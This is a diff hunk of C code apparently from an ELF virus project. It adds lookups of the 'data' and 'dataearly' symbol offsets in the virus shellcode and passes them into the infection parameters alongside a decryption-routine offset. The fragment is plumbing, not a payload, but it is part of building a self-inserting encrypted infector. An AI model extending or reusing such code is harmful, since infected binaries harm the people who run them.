@@ -60,9 +60,17 @@ int get_virus_info(InfectParams *p){
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "DECRYPT_ROUTINE", (int64_t*)&decrypt_routine_off);
 	decrypt_routine_off -= bin_start_off; 
 
+	int64_t data_off;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "data", (int64_t*)&data_off);
+	data_off -= bin_start_off; 
+	
+	int64_t dataearly_off;
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "dataearly", (int64_t*)&dataearly_off);
+	dataearly_off -= bin_start_off; 
+	
 	void *x = ft_malloc(1024);
 	((int*)x)[0] = 0;
-	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x};
+	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len, decrypt_routine_off, x, data_off, dataearly_off};
 	return TRUE;
 }
 
